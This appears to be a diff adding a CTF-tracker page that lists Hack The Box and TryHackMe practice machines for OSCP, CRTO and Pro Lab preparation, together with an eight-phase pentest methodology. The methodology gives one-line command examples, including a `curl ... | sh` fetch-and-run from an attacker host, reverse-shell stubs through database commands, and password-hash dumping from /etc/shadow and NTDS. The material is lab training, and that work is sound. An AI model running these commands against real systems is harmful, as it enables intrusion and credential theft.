+| Holiday | HTB | Linux | Hard | Yes | Bypassing-XSS-filtering, Exploiting-NPM-CLI, HTB | https://app.hackthebox.com/machines/holiday |
+| Monitors | HTB | Linux | Hard | Yes | CVE-2020-9496, Exploit-modification, HTB, Java-Deserialization, Local-File-Inclusion | https://app.hackthebox.com/machines/monitors |
+| Unobtainium | HTB | Linux | Hard | Yes | HTB, Prototype-pollution | https://app.hackthebox.com/machines/unobtainium |
+| Zipper | HTB | Linux | Hard | Yes | HTB, Zabbix-API | https://app.hackthebox.com/machines/zipper |
+| CrossFit | HTB | Linux | Insane | Yes | Blind-XSS, COR's-(Cross, CVE-2019-10774, HTB | https://app.hackthebox.com/machines/crossfit |
+| Fingerprint | HTB | Linux | Insane | Yes | Forging-JWT-tokens, HQL-Injection, HTB | https://app.hackthebox.com/machines/fingerprint |
+| Fulcrum | HTB | Linux | Insane | Yes | Advanced-remote, HTB, network-rules | https://app.hackthebox.com/machines/fulcrum |
+| Hackback | HTB | Windows | Insane | Yes | ASPX-tunneling, HTB, Named-pipe-impersonation | https://app.hackthebox.com/machines/hackback |
+| Sink | HTB | Linux | Insane | Yes | HTB, HTTP-Desync | https://app.hackthebox.com/machines/sink |
+| Stacked | HTB | Linux | Insane | Yes | 2021, 32090, CVE-2021-32090, Exploiting-CVE, HTB | https://app.hackthebox.com/machines/stacked |
+
+### HTB Starting Point Machine List (https://ctftracker.com/htb-starting-point-machines/)
+HTB Starting Point is the guided beginner track on Hack The Box, organised into tiers that introduce core services, simple web flaws and first privilege escalations. It is not a certification, but it is the usual entry route before OSCP or CPTS style preparation. These machines are short and forgiving, so they are ideal for building the habit of scanning, enumerating each service and writing down what you learn. Finish a tier, then repeat the box without the guide to check that the process has stuck.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Appointment | HTB | Linux | Very Easy | No | SQLi, Web Auth Bypass, SQL Injection | https://ctftracker.com/machines/htb-appointment/ |
+| Archetype | HTB | Windows | Very Easy | No | MSSQL, xp_cmdshell, JuicyPotato, PowerShell | https://ctftracker.com/machines/htb-archetype/ |
+| Base | HTB | Linux | Very Easy | No | PHP, Type Juggling, File Upload | https://ctftracker.com/machines/htb-base/ |
+| Crocodile | HTB | Linux | Very Easy | No | FTP, Admin Panel, Gobuster | https://ctftracker.com/machines/htb-crocodile/ |
+| Dancing | HTB | Windows | Very Easy | No | SMB, Share Enumeration, smbclient | https://ctftracker.com/machines/htb-dancing/ |
+| Explosion | HTB | Windows | Very Easy | No | RDP, Remote Desktop, Default Credentials | https://ctftracker.com/machines/htb-explosion/ |
+| Fawn | HTB | Linux | Very Easy | No | FTP, Anonymous Login | https://ctftracker.com/machines/htb-fawn/ |
+| Ignition | HTB | Linux | Very Easy | No | http, cms, credentials, starting-point | https://ctftracker.com/machines/htb-ignition/ |
+| Meow | HTB | Linux | Very Easy | No | Telnet, Default Credentials, Recon | https://ctftracker.com/machines/htb-meow/ |
+| Pennyworth | HTB | Linux | Very Easy | No | Jenkins, Groovy, RCE, Default Credentials | https://ctftracker.com/machines/htb-pennyworth/ |
+| Redeemer | HTB | Linux | Very Easy | No | Redis, Database, Unauthenticated | https://ctftracker.com/machines/htb-redeemer/ |
+| Sequel | HTB | Linux | Very Easy | No | MySQL, MariaDB, Default Credentials | https://ctftracker.com/machines/htb-sequel/ |
+| Tactics | HTB | Windows | Very Easy | No | smb, administrator, share, starting-point | https://ctftracker.com/machines/htb-tactics/ |
+| Vaccine | HTB | Linux | Very Easy | No | FTP, SQLi, Sudo, Tar Wildcard | https://ctftracker.com/machines/htb-vaccine/ |
+| Bike | HTB | Linux | Very Easy | No | Node.js, SSTI, Handlebars | https://app.hackthebox.com/starting-point |
+| Funnel | HTB | Linux | Very Easy | No | SSH, Port Forwarding, PostgreSQL, Tunneling | https://app.hackthebox.com/starting-point |
+| Guard | HTB | Linux | Very Easy | No | SSH, Hash Cracking, Sudo | https://app.hackthebox.com/starting-point |
+| Included | HTB | Linux | Very Easy | No | TFTP, LFI, Local File Inclusion | https://app.hackthebox.com/starting-point |
+| Markup | HTB | Windows | Very Easy | No | XXE, XML, SSH, Scheduled Task | https://app.hackthebox.com/starting-point |
+| Oopsie | HTB | Linux | Very Easy | No | IDOR, SUID | https://app.hackthebox.com/starting-point |
+| Three | HTB | Linux | Very Easy | No | AWS, S3, Cloud, Subdomain | https://app.hackthebox.com/starting-point |
+| Unified | HTB | Linux | Very Easy | No | Log4j, CVE-2021-44228, UniFi, MongoDB | https://app.hackthebox.com/starting-point |
+
+### CRTO Machine List (https://ctftracker.com/crto-like-machines/)
+CRTO, the Certified Red Team Operator from Zero-Point Security, tests red team tradecraft rather than single box exploitation. The exam is practical and centres on operating a command and control framework against an Active Directory environment, including lateral movement and evasion. The Windows and Active Directory boxes here let you rehearse the underlying skills the course builds on: domain enumeration, credential abuse, delegation, Kerberos attacks and moving between hosts. Treat them as a way to understand the attacks before running them through a C2 framework.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Forest | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting, Active Directory, BloodHound, DCSync | https://app.hackthebox.com/machines/Forest |
+| Sauna | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting-Attack, Active Directory, BloodHound, DCSync-Attack | https://app.hackthebox.com/machines/Sauna |
+| Cascade | HTB | Windows | Medium | Yes | AD Recycle Bin, AES-Encryption, Active Directory, Active-Directory, LDAP | https://app.hackthebox.com/machines/Cascade |
+| Eden | THM | Windows | Medium | No | Active Directory, Kerberos, Pass-the-Ticket, BloodHound, Rubeus | https://tryhackme.com/room/eden |
+| Intelligence | HTB | Windows | Medium | Yes | AD CS, ADIDNS-abuse, Active Directory, BloodHound, Certipy | https://app.hackthebox.com/machines/Intelligence |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Resolute | HTB | Windows | Medium | Yes | Active Directory, DLL Injection, DNSAdmins, DnsAdmins-Abuse, Password Spray | https://app.hackthebox.com/machines/Resolute |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| VulnNet: Active (Retired) | THM | Windows | Medium | No | Active Directory, Redis, GPP-Passwords, Kerberoast, BloodHound | https://tryhackme.com/room/vulnnetactive |
+| Za | THM | Windows | Medium | No | Active Directory, Kerberos, BloodHound, GPO Abuse, SMB | https://tryhackme.com/room/za |
+| Blackfield | HTB | Windows | Hard | Yes | AS-REP Roasting, Active Directory, Anonymous-/-Guest, BloodHound, RPC | https://app.hackthebox.com/machines/Blackfield |
+| Enterprise | THM | Windows | Hard | No | Active Directory, ZeroLogon, SQLi, Privilege Escalation, Kerberos | https://tryhackme.com/room/enterprise |
+| Holo | THM | Windows | Hard | No | Active Directory, Multi-Host, Kerberos, BloodHound, Pass-the-Hash | https://tryhackme.com/room/holo |
+| Raz0rBlack | THM | Windows | Hard | No | Active Directory, NFS, Kerberos, AS-REP Roasting, BloodHound | https://tryhackme.com/room/razorblack |
+| Wreath | THM | Windows | Hard | No | Active Directory, Pivoting, Chisel, Empire, C2 | https://tryhackme.com/room/wreath |
+
+### Official Hack The Box Pro Labs (https://ctftracker.com/htb-pro-labs-guide/)
+
+| Pro Lab | Difficulty | Hosts | Flags | Exam Alignment | Description |
+|---|---|---|---|---|---|
+| Genesis | Easy | 6 | 13 | CPTS | Foundational enterprise network and beginner Active Directory penetration testing environment. |
+| Dante | Medium | 14 | 27 | CPTS, OSCP, CRTO | Intermediate enterprise Active Directory with multi-subnet pivoting, Linux and Windows mixed infrastructure. |
+| Zephyr | Hard | 18 | 32 | CRTO, CPTS, OSCP | Advanced Active Directory exploitation, Kerberos delegation attacks, and red team network pivoting. |
+| Offshore | Hard | 18 | 38 | CRTO, OSCP, CRTP | Multi-forest enterprise Active Directory environment with trust relationships, defense evasion, and deep lateral movement. |
+| RastaLabs | Hard | 19 | 26 | CRTP, CRTO | Premier red teaming simulation created by Rastamouse focusing on enterprise domain dominance and stealth operations. |
+| Cybernetics | Insane | 27 | 40 | OSEP, CRTO | Comprehensive enterprise red team simulation with advanced EDR evasion, segmented networks, and complex attack paths. |
+| AptLabs | Insane | 21 | 35 | OSEP | Advanced Persistent Threat (APT) simulation focusing on modern defense evasion, C2 infrastructure, and enterprise compromise. |
+| Halcyon | Hard | 15 | 20 | CPTS, CRTO | Modern hybrid cloud and on-premises enterprise Active Directory simulation featuring Azure AD / Entra ID attack vectors. |
+| Mayhem | Hard | 16 | 25 | CPTS, OSCP | Hardened Windows and Linux dual-infrastructure enterprise environment with multi-tier network segregation. |
+| Blizzard | Insane | 16 | 24 | OSEP, CRTO | Adversary emulation and red team infrastructure simulation in an enterprise environment protected by modern defensive controls. |
+
+---
+
+## Axis 2: How to Prepare for Pentest & Red Team Certifications?
+
+### Long-Form Preparation Guides
+- **[OSCP Exam Scoring & 24h Time Budget (2026 Changes)](https://ctftracker.com/oscp-exam-scoring-and-time-budget/)**: OSCP point structure, which combinations reach 70, an hour-by-hour 24h plan with a 90 minute rabbit-hole cap, and the December 2026 scaled scoring change.
+- **[TJ Null List (2026): OSCP-Like HTB & THM Machines](https://ctftracker.com/tj-null-list/)**: The TJ Null list of OSCP-like machines explained: how to work it, which Hack The Box boxes from it you can track, plus other THM and HTB OSCP practice.
+- **[OSCP Report Template (Markdown) with CVSS Findings](https://ctftracker.com/oscp-report-template/)**: Copyable Markdown OSCP report skeleton, a finding template, a CVSS 3.1 worked example (9.8 Critical), proof screenshot rules and packaging steps.
+- **[HTB & TryHackMe Progress Tracker (Free, Offline)](https://ctftracker.com/htb-progress-tracker/)**: What HTB and TryHackMe profiles do not track, how a spreadsheet compares with ZeroBox, plus a workflow with nmap imports. Free and offline.
+- **[HTB CPTS Exam Guide: Flags, Passing Score, Pacing](https://ctftracker.com/cpts-exam-guide/)**: HTB CPTS exam format, the 10 day window, flags and passing requirement, the report, and a day-by-day pacing plan, with sources cited.
+- **[HTB vs TryHackMe: Which for OSCP, Beginners, AD?](https://ctftracker.com/htb-vs-tryhackme/)**: HTB vs TryHackMe compared with catalogue data: 576 HTB and 451 THM machines by OS, difficulty and OSCP tags, and which to use. Free.
+- **[HTB Pro Labs Guide: Dante, Zephyr, Offshore Compared](https://ctftracker.com/htb-pro-labs-guide/)**: Compare all 10 Hack The Box Pro Labs (Genesis, Dante, Zephyr, Offshore, RastaLabs, Cybernetics) by hosts, flags, difficulty and CPTS, OSCP or CRTO fit.
+
+### Eight-Phase Pentest Methodology (https://ctftracker.com/methodology-guide/)
+#### Phase 01: Host Discovery & Surface Mapping (https://ctftracker.com/methodology/01-surface-mapping/)
+Scan the target host across TCP and UDP ports, detect open services, and fingerprint the underlying operating system.
+- **Fast SYN Scan (Top 1000 TCP Ports)**: Quick sweep of common TCP ports with default scripts and service versions. (e.g. `nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}`)
+- **Full 65,535 TCP Exhaustive Port Sweep**: Ensure no non-standard or high-numbered services (e.g. 8080, 8443, 9001) are missed. (e.g. `nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}`)
+- **Top UDP Service Discovery Scan**: Probe high-value UDP targets including SNMP, DNS, TFTP, and NTP. (e.g. `sudo nmap -sU --top-ports 100 -Pn --open -oN nmap_udp.txt {TARGET_IP}`)
+- **OS Fingerprinting & TCP/IP Stack Analysis**: Determine exact kernel/OS flavor (Linux distro, Windows build, BSD). (e.g. `nmap -O --osscan-guess {TARGET_IP}`)
+
+#### Phase 02: Protocol & Service Enumeration (https://ctftracker.com/methodology/02-service-enumeration/)
+Deeply inspect every discovered service without active exploitation, identifying versions, endpoints, and misconfigurations.
+- **Banner Grabbing & Service Response Check**: Read raw banners on all open ports to identify unmasked daemons. (e.g. `nc -nv {TARGET_IP} {PORT} or curl -I http://{TARGET_IP}:{PORT}`)
+- **Nmap Safe NSE Service-Specific Scripts**: Gather verbose capabilities without triggering active exploits. (e.g. `nmap -sC --script "safe and discovery" -p {PORT} {TARGET_IP}`)
+- **Technology Stack Fingerprinting (WhatWeb, Wappalyzer)**: Detect web server, CMS, programming framework (PHP, Node, Django), and proxy headers. (e.g. `whatweb -a 3 http://{TARGET_IP}/`)
+- **Source Code, Comments & Metadata Inspection**: Check HTML comments, developer notes, /robots.txt, /sitemap.xml, and exposed .git/.env. (e.g. `curl -s http://{TARGET_IP}/ | grep -E "<!--|TODO|DEBUG|api"`)
+- **Virtual Host & Subdomain Enumeration**: Discover hidden virtual hosts routed on the same IP. (e.g. `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP}/ -H "Host: FUZZ.{TARGET_DOMAIN}" -mc 200,301,302 -fs {BASELINE_SIZE}`)
+- **Recursive Directory & Endpoint Fuzzing**: Identify hidden administrative panels, upload directories, API routes, and backups. (e.g. `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.txt,.bak,.json,.sh -ac`)
+
+#### Phase 03: Vulnerability Identification & Threat Modeling (https://ctftracker.com/methodology/03-threat-modeling/)
+Correlate identified versions against public CVE databases, test authentication mechanisms, and map out viable exploitation chains.
+- **Public CVE & Exploit-DB Search**: Query local and remote exploit databases for published weaponized PoCs. (e.g. `searchsploit {SERVICE_NAME} {VERSION}`)
+- **Default Credentials Verification on Management Consoles**: Check administrative dashboards, routers, Jenkins, Tomcat, and Webmin. (e.g. `Testing admin:admin, admin:password, root:root, etc.`)
+- **Branch A: Authentication & Session Analysis (JWT, IDOR, Cookies)**: Examine authorization mechanisms for broken object-level access (IDOR) and weak tokens. (e.g. `Inspect Set-Cookie, test JWT algorithm none / weak secret key`)
+- **Branch B: Known Protocol Flaws (MS17-010, SMBGhost, SambaCry)**: Verify presence of critical remote code execution vulnerabilities in SMB stack. (e.g. `nmap -p 445 --script smb-vuln-ms17-010 {TARGET_IP}`)
+
+#### Phase 04: Foothold Execution & Initial Access (https://ctftracker.com/methodology/04-initial-access/)
+Deliver initial exploit payload, bypass security controls, and obtain a reliable remote command execution or reverse shell.
+- **Branch A: Web Injections (SQLi, SSTI, LFI Wrappers, Cmd Injection)**: Exploit input validation flaws to retrieve database tables or read source code. (e.g. `sqlmap -u "http://{TARGET_IP}/view?id=1" --batch --dbs or curl -s "http://{TARGET_IP}/?page=php://filter/convert.base64-encode/resource=config.php"`)
+- **Branch A: File Upload Filter Bypass (Webshell Delivery)**: Bypass file upload restrictions to write interactive webshell to webroot. (e.g. `Upload .phtml, .php5, .phar, double extension or Content-Type spoofing`)
+- **Branch D: Out-of-Band Command Execution via Database**: Leverage database administrative privileges to execute system commands. (e.g. `EXEC xp_cmdshell 'powershell ...' or COPY table FROM PROGRAM 'bash -i ...'`)
+- **Branch C: Credential Validation & Remote Shell Connect**: Establish authenticated command session using discovered credentials or SSH keys. (e.g. `ssh -i id_rsa user@{TARGET_IP} or evil-winrm -i {TARGET_IP} -u {USER} -p "{PASSWORD}"`)
+- **Listener Setup & Reverse Shell Catch**: Prepare attacker listener and trigger reverse TCP socket callback. (e.g. `nc -lvnp {LPORT}`)
+
+#### Phase 05: Shell Stabilization & Context Triage (https://ctftracker.com/methodology/05-shell-stabilization/)
+Upgrade the raw socket into a full interactive TTY terminal, assess current user permissions, and verify sandbox or container constraints.
+- **Interactive TTY Upgrade (Python PTY / stty raw -echo)**: Enable tab-completion, clear screen, arrow keys, and Ctrl+C interrupt handling. (e.g. `python3 -c 'import pty; pty.spawn("/bin/bash")'`)
+- **Identity & Privilege Context Inspection**: Confirm current UID/GID, security groups, and enabled privileges. (e.g. `id; whoami; whoami /priv`)
+- **Container & Sandbox Detection (Docker / LXC / WSL)**: Verify whether access is restricted to a container environment requiring breakout. (e.g. `cat /proc/1/cgroup | grep docker; ls -la /.dockerenv`)
+- **Internal Network Interfaces & Routing Table**: Detect secondary subnets, internal VLANs, and loopback adapters. (e.g. `ip a or ifconfig; ip route or route print`)
+
+#### Phase 06: Internal System & Network Reconnaissance (https://ctftracker.com/methodology/06-internal-recon/)
+Run automated internal audit scripts, search for unquoted paths, crontabs, internal sockets, and scavenge plain-text credentials.
+- **Automated Enumeration Script Execution (LinPEAS / WinPEAS)**: Highlight high-probability privilege escalation vectors in color-coded audit output. (e.g. `curl -L http://{LHOST}:8000/linpeas.sh | sh or .\winPEASany.exe`)
+- **Internal Loopback Services & Listening Sockets**: Locate local-only HTTP services, internal databases, or debugging ports on 127.0.0.1. (e.g. `ss -tulpn | grep LISTEN or netstat -ano | findstr LISTENING`)
+- **Process Monitoring & Scheduled Jobs**: Inspect recurring tasks running as root or administrative service accounts. (e.g. `cat /etc/crontab /etc/cron.*/* or schtasks /query /fo LIST /v`)
+- **Credential Scavenging in Configs, Backups & Histories**: Check web database credentials (wp-config.php, .env), bash history, and KeePass databases. (e.g. `grep -rnwi "password" /var/www/ 2>/dev/null or history | tail -n 50`)
+
+#### Phase 07: Privilege Escalation & Lateral Movement (https://ctftracker.com/methodology/07-privilege-escalation/)
+Exploit system misconfigurations, abuse Active Directory access rights, or escalate privileges to achieve full administrative control.
+- **Sudo Capabilities & Permissions Check (sudo -l)**: Check binaries allowed to run as root with or without password; cross-reference GTFOBins. (e.g. `sudo -l`)
+- **SUID / SGID Binary Discovery & GTFOBins Exploitation**: Search for binaries running with root effective UID. (e.g. `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`)
+- **Linux Binary Capabilities (getcap)**: Audit dangerous capabilities like cap_setuid, cap_dac_read_search, or cap_sys_admin. (e.g. `getcap -r / 2>/dev/null`)
+- **Writable Cron Script or Wildcard Injection Abuse**: Hijack cron scripts or exploit tar/rsync wildcard command execution. (e.g. `cat /etc/crontab; ps -ef | grep cron`)
+- **Writable Sensitive Files (/etc/passwd, /etc/shadow)**: Write a new root user entry with custom crypted password hash if /etc/passwd is writable. (e.g. `ls -l /etc/passwd /etc/shadow`)
+- **Kernel Exploitation (PwnKit, DirtyPipe) [Verified Option]**: Cross-reference kernel release against stable local privilege escalation exploits. (e.g. `uname -a`)
+
+#### Phase 08: Post-Exploitation, Flag Vault & Artifact Collection (https://ctftracker.com/methodology/08-post-exploitation/)
+Retrieve user and root flags, dump master password databases for credential reuse, clean all temporary files, and compile final writeup documentation.
+- **Extract User Flag & Root/SYSTEM Flag**: Safely retrieve flags and copy directly into ZeroBox Flags Vault. (e.g. `cat /home/*/user.txt /root/root.txt or type C:\Users\*\Desktop\*flag.txt`)
+- **Credential & Hashdump Extraction (NTDS.dit / shadow)**: Extract password hashes for offline password recovery or credential stuffing in lab network. (e.g. `impacket-secretsdump {DOMAIN}/{ADMIN}@{TARGET_IP} or cat /etc/shadow`)
+- **Cleanup Temporary Payloads & Tools**: Remove uploaded exploitation binaries and restore original system state. (e.g. `rm -f /tmp/linpeas.sh /tmp/shell.elf C:\Temp\winpeas.exe`)
+- **Document Full Kill-Chain in Writeup Studio**: Ensure all vulnerabilities, PoCs, and remediation suggestions are thoroughly preserved. (e.g. `Export checklist to Markdown and sync with Obsidian vault`)
+
+### Technique Hubs & Practice Box Counts (https://ctftracker.com/techniques/)
+- **[Active Directory](https://ctftracker.com/techniques/active-directory/)** (26 machines): Active Directory is the identity backbone of most Windows networks, and attacking it is the core of many labs and exams.
+- **[Kerberos Attacks](https://ctftracker.com/techniques/kerberos/)** (14 machines): Kerberos is the default authentication protocol in Active Directory, and several of its design details are abusable.
+- **[SMB Enumeration and Exploitation](https://ctftracker.com/techniques/smb/)** (18 machines): SMB exposes file shares, named pipes and RPC, so it is often the first place to look on Windows and Samba hosts.
+- **[SQL Injection](https://ctftracker.com/techniques/sql-injection/)** (28 machines): SQL injection happens when user input is concatenated into a query, letting you change its logic.
+- **[LFI and Path Traversal](https://ctftracker.com/techniques/lfi-path-traversal/)** (27 machines): Local file inclusion and path traversal let you read, and sometimes execute, files the web server can access.
+- **[Command Injection and RCE](https://ctftracker.com/techniques/command-injection/)** (59 machines): Command injection occurs when an application passes input to a system shell.
+- **[Insecure Deserialization](https://ctftracker.com/techniques/deserialization/)** (15 machines): Insecure deserialization lets an attacker supply a crafted serialized object that triggers dangerous code during parsing.
+- **[File Upload Vulnerabilities](https://ctftracker.com/techniques/file-upload/)** (9 machines): Upload features become a foothold when the server stores attacker-controlled content where it can be executed.
+- **[Linux SUID Privilege Escalation](https://ctftracker.com/techniques/linux-suid/)** (31 machines): A SUID binary runs with the file owner privileges, often root, so any way to make it execute your commands is a privilege escalation.
+- **[Sudo Misconfiguration](https://ctftracker.com/techniques/sudo-misconfig/)** (25 machines): Running sudo -l is one of the first checks after landing a shell, because allowed commands may be a direct path to root.
+- **[Cron Job and Scheduled Task Abuse](https://ctftracker.com/techniques/cron-jobs/)** (9 machines): Scheduled jobs run unattended and frequently as root, so a writable script, a relative path or a wildcard in the command line can hand you privileges.
+- **[Windows Privilege Escalation](https://ctftracker.com/techniques/windows-privesc/)** (14 machines): Windows privilege escalation starts with understanding who you are and what the account can do.
+- **[Windows Lateral Movement](https://ctftracker.com/techniques/windows-lateral-movement/)** (10 machines): Lateral movement means using credentials or hashes from one host to reach another.
+- **[Password Cracking and Brute Force](https://ctftracker.com/techniques/password-cracking/)** (37 machines): Many boxes fall to a password that is weak, default or reused.
+- **[Pivoting and Tunneling](https://ctftracker.com/techniques/pivoting-tunneling/)** (23 machines): Pivoting uses a compromised host as a relay into networks you cannot reach directly.
+- **[Buffer Overflow and Binary Exploitation](https://ctftracker.com/techniques/buffer-overflow/)** (12 machines): A classic stack buffer overflow overwrites the saved return address so execution jumps to code you control.
+- **[Docker and Container Escape](https://ctftracker.com/techniques/docker-escape/)** (7 machines): Containers share the host kernel, so a misconfiguration can turn a shell inside one into root on the host.
+- **[CMS Exploitation (WordPress, Joomla)](https://ctftracker.com/techniques/cms-exploitation/)** (30 machines): Content management systems and common platforms are popular targets because they are widely deployed and often outdated.
+- **[API and Web Application Logic Abuse](https://ctftracker.com/techniques/api-abuse/)** (19 machines): APIs expose application logic directly, so flaws are usually about authorisation rather than memory safety.
+- **[Source Code Review](https://ctftracker.com/techniques/source-code-review/)** (16 machines): Reading the application source is often faster than blind testing.
+- **[Network Service Enumeration](https://ctftracker.com/techniques/network-services/)** (51 machines): Good enumeration of network services decides most boxes before any exploit is run.
+
+### Cheatsheet Topics (https://ctftracker.com/cheatsheet-library/)
+- **[Recon & Port Scanning](https://ctftracker.com/cheatsheets/network/)**: 11 command templates (Fast SYN Scan (Top 1000 Ports), All-Port TCP Exhaustive Scan, Top UDP Service Discovery Scan, Nmap NSE Vulnerability Audit Scripts)
+- **[Web & Directory Fuzzing](https://ctftracker.com/cheatsheets/web/)**: 12 command templates (ffuf Directory & Endpoint Fuzzing, ffuf VHost / Virtual Subdomain Fuzzing, ffuf Parameter Discovery (GET/POST), Gobuster Fast Directory Busting)
+- **[Exploitation & Payloads](https://ctftracker.com/cheatsheets/exploitation/)**: 14 command templates (SQLmap Automated Injection & Database Dump, SQLmap Target Saved HTTP Request File, PHP Filter Base64 LFI Wrapper, LFI to RCE via Apache /proc/self/environ)
+- **[Linux PrivEsc & TTY](https://ctftracker.com/cheatsheets/linux-privesc/)**: 12 command templates (TTY Interactive Shell Stabilization (Python + stty), LinPEAS Direct Memory Execution, SUID Binaries Exhaustive Discovery, Linux Binary Capabilities (`getcap`) Audit)
+- **[Windows & Active Directory](https://ctftracker.com/cheatsheets/active-directory/)**: 17 command templates (SharpHound AD Collector Execution, PowerView Domain & User Recon, Impacket GetUserSPNs (Kerberoasting), Impacket SecretsDump (NTDS.dit & SAM Dumps))
+- **[Pivoting & Tunnels](https://ctftracker.com/cheatsheets/pivoting/)**: 9 command templates (Chisel Attacker Reverse Tunnel Server, Chisel Victim Reverse Socks Pivot, SSH Dynamic Port Forwarding (SOCKS5), SSH Local Port Forwarding (-L))
+- **[File Transfers](https://ctftracker.com/cheatsheets/file-transfer/)**: 10 command templates (Python 3 Quick HTTP Server, PowerShell In-Memory Download & Execute, Certutil.exe Windows Native File Fetcher, Impacket SMB Server File Share)
